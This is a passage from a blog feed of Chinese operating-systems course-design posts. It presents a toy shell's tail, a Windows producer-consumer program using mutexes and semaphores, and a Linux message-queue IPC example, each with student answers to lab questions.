class="hljs-comment">//systemcall_ps</span><br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>            system(<span class="hljs-string">&quot;clear&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-comment">//cmd can&#x27;t find;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PID: %ld.没有此命令，请重新输入正确的命令。\n&quot;</span>, (<span class="hljs-keyword">long</span>)getpid());<br>            help();<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>效果如图所示：</p><p><img src="/images/OS/image-20210622141841632.png" alt="效果"></p><p>输入不同的命令：</p><p><img src="/images/OS/image-20210622142014559.png" alt="environ"></p><p><img src="/images/OS/image-20210622142053363.png" alt="help"></p><p><img src="/images/OS/image-20210622142134813.png" alt="ls"></p><p><img src="/images/OS/image-20210622142202534.png" alt="clean"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>shell使用fork函数创建新的进程，用exec在新进程中运行用户指定的程序，最后shell用wait等待新进程的结束。wait系统调用同时从内核取得退出状态以告知子进程是如何结束的。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统课程设计(四)-Windows的互斥与同步</title>
      <link href="/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E5%9B%9B/"/>
      <url>/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！</p><h3 id="Windows-的互斥与同步"><a href="#Windows-的互斥与同步" class="headerlink" title="Windows 的互斥与同步"></a>Windows 的互斥与同步</h3><ol><li><p>实验目的</p><p>(1) 回顾操作系统进程、线程的有关概念，加深对 Windows 线程的理解。<br>(2) 了解互斥体对象，利用互斥与同步操作编写生产者-消费者问题的并发程序，加深对 P (即semWait)、V(即 semSignal)原语以及利用 P、V 原语进行进程间同步与互斥操作的理解。</p></li><li><p>实验内容和步骤</p><ol><li>创建一个“Win32 Consol Application”工程，然后拷贝清单 4-1 中的程序，编译成可执行文件。</li><li>步骤 2：在“命令提示符”窗口运行步骤 1 中生成的可执行文件，列出运行结果。</li><li>步骤 3：仔细阅读源程序，找出创建线程的 WINDOWS API 函数，回答下列问题：线程的第一个执行函数是什么（从哪里开始执行）？它位于创建线程的 API 函数的第几个参数中？</li><li>步骤 4：修改清单 4-1 中的程序，调整生产者线程和消费者线程的个数，使得消费者数目大与生产者，看看结果有何不同。察看运行结果，从中你可以得出什么结论？</li><li>步骤 5：修改清单 4-1 中的程序，按程序注释中的说明修改信号量 EmptySemaphore 的初始化方法，看看结果有何不同。</li><li>步骤 6：根据步骤 4 的结果，并查看 MSDN，回答下列问题：<br>1）CreateMutex 中有几个参数，各代表什么含义。<br>2）CreateSemaphore 中有几个参数，各代表什么含义，信号量的初值在第几个参数中。<br>3）程序中 P、V 原语所对应的实际 Windows API 函数是什么，写出这几条语句。<br>4）CreateMutex 能用 CreateSemaphore 替代吗？尝试修改程序 4-1，将信号量 Mutex 完全用CreateSemaphore 及相关函数实现。写出要修改的语句。</li></ol><p>流程图如下：</p><p><img src="/images/OS/make_consume_flush_chart.png"></p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> SIZE_OF_BUFFER = <span class="hljs-number">2</span>; <span class="hljs-comment">//缓冲区长度</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> ProductID = <span class="hljs-number">0</span>; <span class="hljs-comment">//产品号</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> ConsumeID = <span class="hljs-number">0</span>; <span class="hljs-comment">//将被消耗的产品号</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> in = <span class="hljs-number">0</span>; <span class="hljs-comment">//产品进缓冲区时的缓冲区下标</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> out = <span class="hljs-number">0</span>; <span class="hljs-comment">//产品出缓冲区时的缓冲区下标</span><br><span class="hljs-keyword">int</span> buffer[SIZE_OF_BUFFER]; <span class="hljs-comment">//缓冲区是个循环队列</span><br><span class="hljs-keyword">bool</span> p_ccontinue = <span class="hljs-literal">true</span>; <span class="hljs-comment">//控制程序结束</span><br>HANDLE Mutex; <span class="hljs-comment">//用于线程间的互斥</span><br>HANDLE FullSemaphore; <span class="hljs-comment">//当缓冲区满时迫使生产者等待</span><br>HANDLE EmptySemaphore; <span class="hljs-comment">//当缓冲区空时迫使消费者等待</span><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">Producer</span><span class="hljs-params">(LPVOID)</span></span>; <span class="hljs-comment">//生产者线程</span><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">Consumer</span><span class="hljs-params">(LPVOID)</span></span>; <span class="hljs-comment">//消费者线程</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//创建各个互斥信号</span><br><span class="hljs-comment">//注意，互斥信号量和同步信号量的定义方法不同，互斥信号量调用的是 CreateMutex 函数，同步信号量调用的是 CreateSemaphore 函数，函数的返回值都是句柄。</span><br>Mutex = CreateMutex(<span class="hljs-literal">NULL</span>,FALSE,<span class="hljs-literal">NULL</span>);<br>EmptySemaphore = CreateSemaphore(<span class="hljs-literal">NULL</span>,SIZE_OF_BUFFER,SIZE_OF_BUFFER,<span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//将上句做如下修改，看看结果会怎样</span><br><span class="hljs-comment">//EmptySemaphore = CreateSemaphore(NULL,0,SIZE_OF_BUFFER-1,NULL);FullSemaphore = CreateSemaphore(NULL,0,SIZE_OF_BUFFER,NULL);</span><br><span class="hljs-comment">//调整下面的数值，可以发现，当生产者个数多于消费者个数时，</span><br><span class="hljs-comment">//生产速度快，生产者经常等待消费者；反之，消费者经常等待</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> PRODUCERS_COUNT = <span class="hljs-number">3</span>; <span class="hljs-comment">//生产者的个数</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> CONSUMERS_COUNT = <span class="hljs-number">1</span>; <span class="hljs-comment">//消费者的个数</span><br><span class="hljs-comment">//总的线程数</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> THREADS_COUNT = PRODUCERS_COUNT+CONSUMERS_COUNT;<br>HANDLE hThreads[THREADS_COUNT]; <span class="hljs-comment">//各线程的 handle</span><br>DWORD producerID[PRODUCERS_COUNT]; <span class="hljs-comment">//生产者线程的标识符</span><br>DWORD consumerID[CONSUMERS_COUNT]; <span class="hljs-comment">//消费者线程的标识符</span><br><span class="hljs-comment">//创建生产者线程</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;PRODUCERS_COUNT;++i)&#123;<br>hThreads[i]=CreateThread(<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,Producer,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,&amp;producerID[i]);<br><span class="hljs-keyword">if</span> (hThreads[i]==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//创建消费者线程</span><br><span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;CONSUMERS_COUNT;++i)&#123;<br>hThreads[PRODUCERS_COUNT+i]=CreateThread(<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,Consumer,<span class="hljs-literal">NULL</span>,<span class="hljs-number">0</span>,&amp;consumerID[i]);<br><span class="hljs-keyword">if</span> (hThreads[i]==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(p_ccontinue)&#123;<br><span class="hljs-keyword">if</span>(getchar())&#123; <span class="hljs-comment">//按回车后终止程序运行</span><br>p_ccontinue = <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//生产一个产品。简单模拟了一下，仅输出新产品的 ID 号</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Produce</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;&lt; <span class="hljs-string">&quot;Producing &quot;</span> &lt;&lt; ++ProductID &lt;&lt; <span class="hljs-string">&quot; ... &quot;</span>;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Succeed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-comment">//把新生产的产品放入缓冲区</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Append</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;Appending a product ... &quot;</span>;<br>buffer[in] = ProductID;<br>in = (in+<span class="hljs-number">1</span>)%SIZE_OF_BUFFER;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;Succeed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输出缓冲区当前的状态</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;SIZE_OF_BUFFER;++i)&#123;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; i &lt;&lt;<span class="hljs-string">&quot;: &quot;</span> &lt;&lt; buffer[i];<br><span class="hljs-keyword">if</span> (i==in) <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot; &lt;-- 生产&quot;</span>;<br><span class="hljs-keyword">if</span> (i==out) <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot; &lt;-- 消费&quot;</span>;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//从缓冲区中取出一个产品</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Take</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;Taking a product ... &quot;</span>;<br>ConsumeID = buffer[out];<br>buffer[out] = <span class="hljs-number">0</span>;<br>out = (out+<span class="hljs-number">1</span>)%SIZE_OF_BUFFER;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span> &lt;&lt; <span class="hljs-string">&quot;Succeed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//输出缓冲区当前的状态</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;SIZE_OF_BUFFER;++i)&#123;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; i &lt;&lt;<span class="hljs-string">&quot;: &quot;</span> &lt;&lt; buffer[i];<br><span class="hljs-keyword">if</span> (i==in) <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot; &lt;-- 生产&quot;</span>;<br><span class="hljs-keyword">if</span> (i==out) <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot; &lt;-- 消费&quot;</span>;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//消耗一个产品</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Consume</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Consuming &quot;</span> &lt;&lt; ConsumeID &lt;&lt; <span class="hljs-string">&quot; ... &quot;</span>;<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Succeed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-comment">//生产者</span><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">Producer</span><span class="hljs-params">(LPVOID lpPara)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>(p_ccontinue)&#123;<br>WaitForSingleObject(EmptySemaphore,INFINITE); <span class="hljs-comment">//p(empty);</span><br>WaitForSingleObject(Mutex,INFINITE); <span class="hljs-comment">//p(mutex);</span><br>Produce();<br>Append();<br>Sleep(<span class="hljs-number">1500</span>);<br>ReleaseMutex(Mutex); <span class="hljs-comment">//V(mutex);</span><br>ReleaseSemaphore(FullSemaphore,<span class="hljs-number">1</span>,<span class="hljs-literal">NULL</span>); <span class="hljs-comment">//V(full);</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//消费者</span><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">Consumer</span><span class="hljs-params">(LPVOID lpPara)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>(p_ccontinue)&#123;<br>WaitForSingleObject(FullSemaphore,INFINITE); <span class="hljs-comment">//P(full);</span><br>WaitForSingleObject(Mutex,INFINITE); <span class="hljs-comment">//P(mutex);</span><br>Take();<br>Consume();<br>Sleep(<span class="hljs-number">1500</span>);<br>ReleaseMutex(Mutex); <span class="hljs-comment">//V(mutex);</span><br>ReleaseSemaphore(EmptySemaphore,<span class="hljs-number">1</span>,<span class="hljs-literal">NULL</span>); <span class="hljs-comment">//V(empty);</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>分析：</p><ul><li>仔细阅读源程序，找出创建线程的 WINDOWS API 函数，回答下列问题：线程的第一个执行函数是什么（从哪里开始执行）？它位于创建线程的 API 函数的第几个参数中？</li></ul><p>线程执行的第一个函数是DWORD WINAPI Producer(LPVOIDIpPara)，从hThreads[i]=CreateThread(NULL,0,Producer,NULL,0,&amp;producerID[i]);开始执行，位于创建线程的API函数的第三个参数中。</p><ul><li>修改清单 4-1 中的程序，调整生产者线程和消费者线程的个数，使得消费者数目大与生产者，看看结果有何不同。察看运行结果，从中你可以得出什么结论？</li></ul><p>当生产者个数多于消费者个数时，生产速度快，生产者经常等待消费者。反之，消费者等待。</p><ul><li>修改清单 4-1 中的程序，按程序注释中的说明修改信号量 EmptySemaphore 的初始化方法，看看结果有何不同。</li></ul><p>无法执行</p><ul><li>1）CreateMutex 中有几个参数，各代表什么含义。</li></ul><p>三个参数，LPSECURITY_ATTRIBUTESIpMutexAttributes，//指向安全属性的指针。BOOLbInitialOwner，//初始化互斥对象的所有者。LPCTSTRIpName//指向互斥对象名的指针。</p><ul><li>CreateSemaphore 中有几个参数，各代表什么含义，信号量的初值在第几个参数中。</li></ul><p>有四个参数。IpSemaphoreAttributes SECURITY_ATTRIBUTES，该参数定义了信号量的安全特性。IInitiaICount Long，设置信号量的初始计数。IMaximumCount Long，设置信号量的最大计数。IpNameString，指定信号量对象的名称。信号量的初值在第二个参数中。</p><ul><li>3）程序中 P、V 原语所对应的实际 Windows API 函数是什么，写出这几条语句。</li></ul><p>WaitForSingIeObject(FullSemaphore,INFINITE);//P(full);</p><p>WaitForSingIeObject(Mutex,INFINITE);//P(mutex);</p><p>ReleaseMutex(Mutex);//V(mutex);</p><p>ReleaseSemaphore(FullSemaphore,1,NULL);//V(full);</p><ul><li>CreateMutex 能用 CreateSemaphore 替代吗？尝试修改程序 4-1，将信号量 Mutex 完全用CreateSemaphore 及相关函数实现。写出要修改的语句。</li></ul><p>可以替代。Mutex=CreateSemaphore(NULL,false,false,NULL);</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统课程设计(三)-Linux进程间通信</title>
      <link href="/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%B8%89/"/>
      <url>/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！</p><h3 id="实验三-Linux-进程间通信"><a href="#实验三-Linux-进程间通信" class="headerlink" title="实验三  Linux 进程间通信"></a>实验三  Linux 进程间通信</h3><ol><li><p>实验目的</p><p>Linux 系统的进程通信机构（IPC）允许在任意进程间大批量地交换数据，通过本实验，理解熟悉 Linux 支持的消息通信机制。</p></li><li><p>实验内容和步骤</p><p>（1）使用系统调用 msgget()，msgsnd()，msgrcv()及 msgctl()编制一长度为 1K 的消息的发送和接收程序。</p><ul><li>为了便于操作和观察结果，用一个程序作为“引子”，先后 fork()两个子进程 SERVER和 CLIENT，进行通信。</li><li>SERVER 端建立一个 key 为 75 的消息队列，等待其他进程发来的消息。当遇到类型为 1 的消息，则作为结束信号，取消该队列，并退出 SERVER。SERVER 每接收到一个消息后显示一句“（server） received”。</li><li>CLIENT 端使用 key 为 75 的消息队列，先后发送类型从 10 到 1 的消息，然后退出。最后的一个消息，即是 SERVER 端需要的结束信号。CLIENT 每发送一条消息后显示一句“(client)sent”。</li><li>父进程在 SERVER 和 CLIENT 均退出后结束。</li></ul><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSGKEY 75</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msgform</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">long</span> mtype;<br><span class="hljs-keyword">char</span> mtext[<span class="hljs-number">1030</span>];<br>&#125;msg;<br><span class="hljs-keyword">int</span> msgqid,i;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CLIENT</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i;<br>msgqid=msgget(MSGKEY,<span class="hljs-number">0777</span>);<br><span class="hljs-keyword">for</span> (i=<span class="hljs-number">10</span>;i&gt;=<span class="hljs-number">1</span>;i--)<br>&#123;<br>msg.mtype=i;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(client) sent \n&quot;</span>);<br>msgsnd(msgqid,&amp;msg,<span class="hljs-number">1024</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SERVER</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>msgqid=msgget(MSGKEY,<span class="hljs-number">0777</span>|IPC_CREAT);<br><span class="hljs-keyword">do</span>&#123;<br>    msgrcv(msgqid,&amp;msg,<span class="hljs-number">1030</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;(Server) recieved\n&quot;</span>);<br>&#125; <span class="hljs-keyword">while</span>(msg.mtype!=<span class="hljs-number">1</span>);<br>msgctl(msgqid,IPC_RMID,<span class="hljs-number">0</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>((i=fork())==<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span>(!i) SERVER();<br><span class="hljs-keyword">while</span>((i=fork())==<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span>(!i) CLIENT();<br>wait(<span class="hljs-number">0</span>);<br>wait(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>运行效果如下：</p><p><img src="/images/OS/image-20210622101121108.png" alt="效果"></p></li></ol><p>   UINX/Linux 系统把信号量、消息队列和共享资源统称为进程间通信资源(IPC resource)。提供给用户的 IPC 资源是通过一组系统调用实现的。</p><ul><li><p>用信号量对进程要访问的临界资源进行保护。</p></li><li><p> 用消息队列在进程间以异步方式发送消息。</p></li><li><p>用一块预留出的内存区域供进程之间交换数据。</p><p>分析：</p><p>创建 IPC 资源的系统调用有：</p></li><li><p>semget()—获得信号量的 IPC 标识符。</p></li><li><p> msgget()—获得消息队列的 IPC 标识符。</p></li><li><p>shmget()—获得共享内存的 IPC 标识符。</p><p>控制 IPC 资源的系统调用有：</p></li><li><p>semctl()—对信号量资源进行控制的函数。</p></li><li><p>msgctl()—对消息队列进行控制的函数。</p></li><li><p>shmctl()—对共享内存进行控制的函数。</p><p>上述函数为获得和设置资源的状态信息提供了一些命令。例如：</p></li><li><p>IPC_SET 命令：设置属主的用户标识符和组标识符。</p></li><li><p> IPC_STAT 和 IPC_INFO 命令：获得资源状态信息。</p></li><li><p>IPC_RMID 命令：释放这个资源。</p><p>操作 IPC 资源的系统调用有：</p></li><li><p>semop()—获得或释放一个 IPC 信号量。 可以实现 P、V 操作</p></li><li><p>msgsnd()—发送一个 IPC 消息。</p></li><li><p> msgrcv()—接收一个 IPC 消息。</p></li><li><p> shmat()—将一个 IPC 共享内存段添加到进程的地址空间</p></li><li><p>shmdt()——将 IPC 共享内存段从私有的地址空间剥离。</p><p>message的传送和控制并不保证完全同步,当一个程序不在激活状态的时候,它完全可能继续睡眠,造成上面现象,在多次send message 后才 receive message.这一点有助于理解消息转送的实现机理。</p><p>（2）观察参考程序，说明控制消息队列系统调用 msgctl()在此起什么作用？</p><p>在此调用msgctl是用于删除id的消息队列。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 课程设计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统课程设计(二)-Linux进程管理</title>
      <link href="/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%BA%8C/"/>
      <url>/2021/06/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1-%E4%BA%8C/</url>
      
